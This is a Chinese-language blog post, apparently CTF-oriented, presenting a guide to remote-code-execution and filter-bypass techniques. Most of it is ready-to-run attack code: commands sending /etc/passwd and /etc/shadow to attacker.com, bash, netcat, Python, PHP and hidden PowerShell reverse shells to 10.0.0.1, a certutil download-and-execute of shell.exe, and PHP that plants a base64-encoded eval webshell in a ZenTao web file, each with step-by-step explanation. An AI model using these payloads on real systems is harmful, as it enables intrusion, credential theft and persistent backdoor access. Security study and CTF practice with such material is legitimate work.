<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>命令执行(RCE)绕过技术 | SoulfulVoyager</title><meta name="author" content="Abernethy"><meta name="copyright" content="Abernethy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="命令执行(RCE)绕过技术全面指南参考https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq\_43431158&#x2F;article&#x2F;details&#x2F;105422347，写到异或绕过 1.  基础概念RCE (Remote Code Execution)：远程代码执行漏洞，攻击者可直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。 2. 常见执行函数2.1 PHP代码执行函数eval()、as">
<meta property="og:type" content="article">
<meta property="og:title" content="命令执行(RCE)绕过技术">
<meta property="og:url" content="https://sebastian-alphax.github.io/2025/09/22/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/index.html">
<meta property="og:site_name" content="SoulfulVoyager">
<meta property="og:description" content="命令执行(RCE)绕过技术全面指南参考https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq\_43431158&#x2F;article&#x2F;details&#x2F;105422347，写到异或绕过 1.  基础概念RCE (Remote Code Execution)：远程代码执行漏洞，攻击者可直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。 2. 常见执行函数2.1 PHP代码执行函数eval()、as">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1757651700281.png">
<meta property="article:published_time" content="2025-09-21T16:36:47.252Z">
<meta property="article:modified_time" content="2025-09-21T16:36:47.253Z">
<meta property="article:author" content="Abernethy">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="bypass">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1757651700281.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "命令执行(RCE)绕过技术",
  "url": "https://sebastian-alphax.github.io/2025/09/22/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/",
  "image": "https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1757651700281.png",
  "datePublished": "2025-09-21T16:36:47.252Z",
  "dateModified": "2025-09-21T16:36:47.253Z",
  "author": [
    {
      "@type": "Person",
      "name": "Abernethy",
      "url": "https://sebastian-alphax.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/icons8.jpg"><link rel="canonical" href="https://sebastian-alphax.github.io/2025/09/22/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '命令执行(RCE)绕过技术',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/gallery/"><i class="fa-fw fas fa-video"></i><span> gallery</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1757651700281.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">SoulfulVoyager</span></a><a class="nav-page-title" href="/"><span class="site-name">命令执行(RCE)绕过技术</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/gallery/"><i class="fa-fw fas fa-video"></i><span> gallery</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">命令执行(RCE)绕过技术</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-09-21T16:36:47.252Z" title="Created 2025-09-22 00:36:47">2025-09-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-09-21T16:36:47.253Z" title="Updated 2025-09-22 00:36:47">2025-09-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Command-Injection/">Command Injection</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Command-Injection/bypass/">bypass</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="命令执行-RCE-绕过技术全面指南"><a href="#命令执行-RCE-绕过技术全面指南" class="headerlink" title="命令执行(RCE)绕过技术全面指南"></a>命令执行(RCE)绕过技术全面指南</h1><p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq/_43431158/article/details/105422347%EF%BC%8C%E5%86%99%E5%88%B0%E5%BC%82%E6%88%96%E7%BB%95%E8%BF%87">https://blog.csdn.net/qq\_43431158/article/details/105422347，写到异或绕过</a></p>
<h2 id="1-基础概念"><a href="#1-基础概念" class="headerlink" title="1.  基础概念"></a>1.  基础概念</h2><p><strong>RCE (Remote Code Execution)</strong>：远程代码执行漏洞，攻击者可直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p>
<h2 id="2-常见执行函数"><a href="#2-常见执行函数" class="headerlink" title="2. 常见执行函数"></a>2. 常见执行函数</h2><h3 id="2-1-PHP代码执行函数"><a href="#2-1-PHP代码执行函数" class="headerlink" title="2.1 PHP代码执行函数"></a>2.1 PHP代码执行函数</h3><p><code>eval()</code>、<code>assert()</code>、<code>preg_replace()</code>、<code>create_function()</code>、<code>array_map()</code>、<code>call_user_func()</code>、<code>call_user_func_array()</code>、<code>array_filter()</code>、<code>uasort()</code>等。</p>
<h3 id="2-2-PHP命令执行函数"><a href="#2-2-PHP命令执行函数" class="headerlink" title="2.2 PHP命令执行函数"></a>2.2 PHP命令执行函数</h3><p><code>system()</code>、<code>exec()</code>、<code>shell_exec()</code>、<code>pcntl_exec()</code>、<code>popen()</code>、<code>proc_popen()</code>、<code>passthru()</code>等。</p>
<p><code>passthru(&#39;tac fla*&#39;);</code></p>
<h3 id="2-3-特殊函数利用"><a href="#2-3-特殊函数利用" class="headerlink" title="2.3 特殊函数利用"></a>2.3 特殊函数利用</h3><ul>
<li><p><strong>反引号执行</strong>：<code>`ls`</code> 或 <code>&lt;?= </code>ls<code> ?&gt;</code>（短标签形式）</p>
</li>
<li><p><strong>无参数函数调用</strong>：PHP 7+支持<code>(&#39;phpinfo&#39;)();</code>形式的调用</p>
</li>
</ul>
<h2 id="3-从系统提取数据"><a href="#3-从系统提取数据" class="headerlink" title="3. 从系统提取数据"></a>3. 从系统提取数据</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># File reading</span></span><br><span class="line">$(cat /etc/passwd &gt; /dev/tcp/attacker.com/4444)</span><br><span class="line">; base64 /etc/shadow | curl -d @- http://attacker.com</span><br><span class="line"></span><br><span class="line"><span class="section"># System enumeration</span></span><br><span class="line">; find / -perm -4000 2&gt;/dev/null</span><br><span class="line">; netstat -an | nc attacker.com 4444</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>netstat -an</code>：<code>netstat</code> 命令用于显示网络连接、路由表、接口统计等信息。</p>
<ul>
<li><p><code>-a</code>：显示所有活动的连接和监听端口。</p>
</li>
<li><p><code>-n</code>：以数字形式显示地址和端口号，而不尝试进行 DNS 解析。</p>
</li>
</ul>
</li>
</ul>
<h2 id="4-反向-Shell"><a href="#4-反向-Shell" class="headerlink" title="4. 反向 Shell"></a>4. 反向 Shell</h2><h3 id="4-1-基本反向"><a href="#4-1-基本反向" class="headerlink" title="4.1 基本反向"></a>4.1 基本反向</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># Bash reverse shell</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="section"># Netcat reverse shell</span></span><br><span class="line">nc -e /bin/sh 10.0.0.1 4444</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 4444 &gt;/tmp/f</span><br><span class="line"></span><br><span class="line"><span class="section"># Python reverse shell</span></span><br><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF<span class="emphasis">_INET,socket.SOCK_</span>STREAM);s.connect((&quot;10.0.0.1&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="4-2-Linux反弹shell的方式实现后渗透的利用"><a href="#4-2-Linux反弹shell的方式实现后渗透的利用" class="headerlink" title="4.2 Linux反弹shell的方式实现后渗透的利用"></a>4.2 Linux反弹shell的方式实现后渗透的利用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 反弹shell</span><br><span class="line"><span class="variable">$sock</span> = fsockopen(<span class="string">&quot;192.168.96.1&quot;</span>, 2333);</span><br><span class="line"><span class="variable">$proc</span> = proc_open(<span class="string">&quot;/bin/sh -i&quot;</span>, array(0=&gt;<span class="variable">$sock</span>, 1=&gt;<span class="variable">$sock</span>, 2=&gt;<span class="variable">$sock</span>), <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>fsockopen()</code>: 这是一个PHP函数，用于建立一个网络套接字连接（Socket连接）。它可以用来连接任何TCP或UDP端口。</p>
</li>
<li><p><code>proc_open()</code>: 这个PHP函数用于执行一个命令，并创建一个进程，同时对这个进程的标准输入、输出、错误流进行控制。</p>
</li>
<li><p><code>&quot;/bin/sh -i&quot;</code>: 这是要执行的命令。</p>
<ul>
<li><p><code>/bin/sh</code>: 是Linux系统上的标准Shell解释器（Bourne shell）。有时也会使用<code>/bin/bash</code>。</p>
</li>
<li><p><code>-i</code>: 参数代表“交互式模式”（interactive）。这使得Shell会提供一个提示符，并且对于反向Shell来说，这个参数通常至关重要，它能确保Shell的输入输出被正确重定向。</p>
</li>
</ul>
</li>
<li><p><code>array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock)</code>:</p>
<ul>
<li><p>这是一个数组，它将新进程的文件描述符重定向到我们之前建立的Socket连接（<code>$sock</code>）。</p>
</li>
<li><p><code>0</code>: 代表标准输入（STDIN）。进程将从这里读取输入。</p>
</li>
<li><p><code>1</code>: 代表标准输出（STDOUT）。进程的输出将写入这里。</p>
</li>
<li><p><code>2</code>: 代表标准错误（STDERR）。进程的错误信息将写入这里。</p>
</li>
<li><p>这里将所有三个流（输入、输出、错误）都指向了同一个Socket连接 <code>$sock</code>。</p>
</li>
</ul>
</li>
<li><p><code>$pipes</code>: 这是一个将在调用后被填充的变量，它包含了指向子进程相应管道的数组，但在这个反弹Shell的上下文中，我们并不关心它，因为所有的流都已经重定向到网络Socket了。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 写入webshell</span><br><span class="line"><span class="variable">$maliciousFile</span> = <span class="string">&#x27;/opt/zbox/app/zentao/www/test.php&#x27;</span>;</span><br><span class="line"><span class="variable">$maliciousContent</span> = <span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span>;</span><br><span class="line">file_put_contents(<span class="variable">$maliciousFile</span>, <span class="variable">$maliciousContent</span>);</span><br></pre></td></tr></table></figure>





<h3 id="4-3-Windows-反弹shell实现后渗透利用"><a href="#4-3-Windows-反弹shell实现后渗透利用" class="headerlink" title="4.3 Windows 反弹shell实现后渗透利用"></a>4.3 Windows 反弹shell实现后渗透利用</h3><h4 id="4-3-1-Powershell命令执行"><a href="#4-3-1-Powershell命令执行" class="headerlink" title="4.3.1 Powershell命令执行"></a>4.3.1 Powershell命令执行</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># PowerShell reverse shell</span></span><br><span class="line">powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(<span class="string">&quot;10.0.0.1&quot;</span>,4444);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sendback2</span>  = <span class="variable">$sendback</span> + <span class="string">&quot;PS &quot;</span> + (<span class="built_in">pwd</span>).Path + <span class="string">&quot;&gt; &quot;</span>;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h6 id="A-执行参数（规避检测和限制）："><a href="#A-执行参数（规避检测和限制）：" class="headerlink" title="A. 执行参数（规避检测和限制）："></a>A. 执行参数（规避检测和限制）：</h6><p>这些参数让PowerShell以非常隐蔽的方式运行：</p>
<ul>
<li><p><code>-NoP</code> (<code>-NoProfile</code>)：不加载用户配置文件，加快启动速度，避免配置文件中的命令干扰。</p>
</li>
<li><p><code>-NonI</code> (<code>-NonInteractive</code>)：非交互式模式，适合自动化。</p>
</li>
<li><p><code>-W Hidden</code> (<code>-WindowStyle Hidden</code>)：隐藏窗口，受害者看不到任何弹出的PowerShell窗口。</p>
</li>
<li><p><code>-Exec Bypass</code> (<code>-ExecutionPolicy Bypass</code>)：绕过执行策略。执行策略是PowerShell的安全限制，默认可能阻止脚本运行。此参数绕过所有限制。</p>
</li>
<li><p><code>-Command ...</code>：执行后面跟随的命令字符串。</p>
</li>
</ul>
<h6 id="B-反向Shell代码（核心逻辑）："><a href="#B-反向Shell代码（核心逻辑）：" class="headerlink" title="B. 反向Shell代码（核心逻辑）："></a>B. 反向Shell代码（核心逻辑）：</h6><p>我们从逻辑块来分解这段复杂的代码：</p>
<ol>
<li>建立连接：</li>
</ol>
<ul>
<li><p>$client &#x3D; New-Object System.Net.Sockets.TCPClient(“10.0.0.1”,4444)</p>
<ul>
<li>创建一个TCP客户端对象，并连接到攻击者的IP <code>10.0.0.1</code> 的 <code>4444</code> 端口。</li>
</ul>
</li>
</ul>
<ul>
<li>获取网络流：</li>
</ul>
<ul>
<li><p>$stream &#x3D; $client.GetStream()</p>
<ul>
<li>获取用于发送和接收数据的网络流对象。</li>
</ul>
</li>
</ul>
<ul>
<li>创建数据缓冲区：</li>
</ul>
<ul>
<li><p>[byte[]]$bytes &#x3D; 0..65535|%{0}</p>
<ul>
<li>创建一个长度为65536字节的数组，并全部初始化为0，用于存放从网络接收到的数据。</li>
</ul>
</li>
</ul>
<ul>
<li>主循环 - 接收并执行命令：</li>
</ul>
<ul>
<li><p>while(($i &#x3D; $stream.Read($bytes, 0, $bytes.Length)) -ne 0)</p>
<ul>
<li><p>这是一个无限循环，只要网络连接还在（读取到的字节数 <code>$i</code> 不为0），就持续运行。</p>
</li>
<li><p><code>$stream.Read(...)</code> 从网络连接中读取数据到 <code>$bytes</code> 缓冲区。</p>
</li>
</ul>
</li>
</ul>
<ul>
<li>解码命令：</li>
</ul>
<ul>
<li><p>$data &#x3D; (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)</p>
<ul>
<li>将接收到的字节数据（<code>$bytes</code>）解码成ASCII字符串（<code>$data</code>）。这个字符串就是攻击者发送的命令。</li>
</ul>
</li>
</ul>
<ul>
<li>执行命令（最关键的一步）：</li>
</ul>
<ul>
<li><p>$sendback &#x3D; (iex $data 2&gt;&amp;1 | Out-String )</p>
<ul>
<li><p><code>iex</code> 是 <code>Invoke-Expression</code> 的别名，它会执行接收到的字符串 <code>$data</code> 作为PowerShell命令。</p>
</li>
<li><p><code>2&gt;&amp;1</code> 将标准错误流合并到标准输出流，确保错误信息也能被捕获。</p>
</li>
<li><p><code>| Out-String</code> 将命令的执行结果转换为字符串。</p>
</li>
</ul>
</li>
</ul>
<ul>
<li>构造提示符并发送回结果：</li>
</ul>
<ul>
<li><p>$sendback2 &#x3D; $sendback + “PS “ + (pwd).Path + “&gt; “$sendbyte &#x3D; ([text.encoding]::ASCII).GetBytes($sendback2)$stream.Write($sendbyte,0,$sendbyte.Length)$stream.Flush()</p>
<ul>
<li><p>在结果后添加一个类似PowerShell的提示符（如 <code>PS C:\&gt;</code>）。</p>
</li>
<li><p>将结果字符串编码为字节，并通过网络流写回给攻击者。</p>
</li>
</ul>
</li>
</ul>
<ul>
<li>关闭连接：</li>
</ul>
<ul>
<li><p>$client.Close()</p>
<ul>
<li>当循环退出后（连接断开），关闭客户端。</li>
</ul>
</li>
</ul>
<p>最终效果： 受害主机会主动连接攻击者的机器（<code>10.0.0.1:4444</code>），并为攻击者提供一个功能完整的PowerShell命令行。</p>
<h4 id="4-3-2-certutil恶意文件下载执行"><a href="#4-3-2-certutil恶意文件下载执行" class="headerlink" title="4.3.2 certutil恶意文件下载执行"></a>4.3.2 certutil恶意文件下载执行</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Certutil download and execute</span></span><br><span class="line">certutil -urlcache -<span class="built_in">split</span> -f http://10.0.0.1/shell.exe C:\Windows\Temp\shell.exe &amp;&amp; C:\Windows\Temp\shell.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol>
<li><p><code>certutil</code>：</p>
<ul>
<li>一个合法的Windows命令行工具，主要用于管理数字证书。因为它是一个可信的、签名的系统程序，所以其网络活动往往不受防火墙或安全软件的严格审查。</li>
</ul>
</li>
<li><p>参数说明：</p>
<ul>
<li><p><code>-urlcache</code>：显示或删除URL缓存条目。但关键的是，它支持从URL检索文件。</p>
</li>
<li><p><code>-split</code>：将ASN.1编码的文件拆分为多个部分（在这里用于正确保存二进制文件）。</p>
</li>
<li><p><code>-f</code> (<code>-force</code>)：强制覆盖现有文件。</p>
</li>
<li><p>这些参数组合在一起，被攻击者滥用来下载文件。</p>
</li>
</ul>
</li>
<li><p>下载文件：</p>
</li>
</ol>
<ul>
<li><p>certutil -urlcache -split -f <a target="_blank" rel="noopener" href="http://10.0.0.1/shell.exe">http://10.0.0.1/shell.exe</a> C:\Windows\Temp\shell.exe</p>
<ul>
<li><p>从攻击者的服务器 <code>http://10.0.0.1/shell.exe</code> 下载一个文件。</p>
</li>
<li><p>将其保存到受害者机器的 <code>C:\Windows\Temp\shell.exe</code> 路径下。选择此目录是因为任何用户通常都有写入权限。</p>
</li>
</ul>
</li>
</ul>
<ul>
<li>执行文件：</li>
</ul>
<ul>
<li><p>&amp;&amp; C:\Windows\Temp\shell.exe</p>
<ul>
<li><p><code>&amp;&amp;</code> 是命令连接符，表示只有前一条命令成功执行后，才执行后面的命令。</p>
</li>
<li><p>执行刚刚下载的恶意程序 <code>shell.exe</code>。这个程序可能是一个后门、勒索软件或任何其他Payload。</p>
</li>
</ul>
</li>
</ul>
<h4 id="4-3-3-windows写入木马"><a href="#4-3-3-windows写入木马" class="headerlink" title="4.3.3 windows写入木马"></a>4.3.3 windows写入木马</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filePath</span> = <span class="string">&#x27;C:\\Users\\t1sts\\Desktop\\ZenTao\\app\\zentao\\www\\x.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$lines</span> = file(<span class="variable">$filePath</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$decodedCode</span> = base64_decode(<span class="string">&quot;QGV2YWwoJF9QT1NUWydUMXN0cyddKTs=&quot;</span>);</span><br><span class="line">array_splice(<span class="variable">$lines</span>, 1, 0, <span class="variable">$decodedCode</span>);</span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="variable">$filePath</span>, implode(<span class="string">&#x27;&#x27;</span>, <span class="variable">$lines</span>));</span><br></pre></td></tr></table></figure>





<h2 id="5-关键字过滤绕过"><a href="#5-关键字过滤绕过" class="headerlink" title="5. 关键字过滤绕过"></a>5. 关键字过滤绕过</h2><h3 id="5-1-命令替代"><a href="#5-1-命令替代" class="headerlink" title="5.1  命令替代"></a>5.1  命令替代</h3><p>使用其他读取命令绕过<code>cat</code>、<code>flag</code>等关键词过滤：</p>
<ul>
<li><p><code>more</code>: 一页一页显示文件内容</p>
</li>
<li><p><code>less</code>: 与more类似，可上下翻页</p>
</li>
<li><p><code>head</code>: 查看头几行</p>
</li>
<li><p><code>tac</code>: 从最后一行开始显示（cat的反向显示）</p>
</li>
<li><p><code>tail</code>: 查看尾几行</p>
</li>
<li><p><code>nl</code>: 显示内容并输出行号</p>
</li>
<li><p><code>od</code>: 以二进制方式读取文件内容</p>
</li>
<li><p><code>vi</code>&#x2F;<code>vim</code>: 编辑器查看文件</p>
</li>
<li><p><code>sort</code>: 排序文件内容</p>
</li>
<li><p><code>uniq</code>: 报告或删除文件中重复行</p>
</li>
<li><p><code>file -f</code>: 报错出具体内容</p>
</li>
<li><p><code>strings</code>: 输出文件中可打印字符</p>
</li>
<li><p><code>grep</code>: 搜索文件中的字符串</p>
</li>
<li><p><code>rev</code>：$(rev&lt;&lt;&lt;’imaohw’)<code>&lt;&lt;&lt;</code> 被称为 “here string”。它是一种将字符串（而不是文件）重定向到命令标准输入的方法。<code>rev</code> 是一个简单的实用程序，用于反转给定输入中的字符顺序。</p>
</li>
</ul>
<h3 id="5-2-符号干扰绕过"><a href="#5-2-符号干扰绕过" class="headerlink" title="5.2 符号干扰绕过"></a>5.2 符号干扰绕过</h3><ul>
<li><p><strong>转义符号</strong>：<code>ca\t /fl\ag</code></p>
</li>
<li><p><strong>单引号包裹</strong>：<code>cat fl&#39;a&#39;g</code> 或 <code>cat fl&#39;&#39;ag</code>（Linux下需要偶数个单引号）</p>
<p><code>&quot;w&quot;h&quot;o&quot;a&quot;m&quot;i</code></p>
</li>
<li><p><strong>双引号包裹</strong>：<code>cat fl&quot;a&quot;g</code> 或 <code>cat fl&quot;&quot;ag</code>（Windows下无限制，Linux需偶数个）</p>
</li>
<li><p><strong>反斜杠</strong>：<code>cat fl\ag.p\hp</code>（Linux下反斜杠作为转义符）</p>
</li>
<li><p><strong>反引号</strong>：<code>cat `echo fla`g</code> 或 <code>cat $(echo fla)g</code></p>
</li>
</ul>
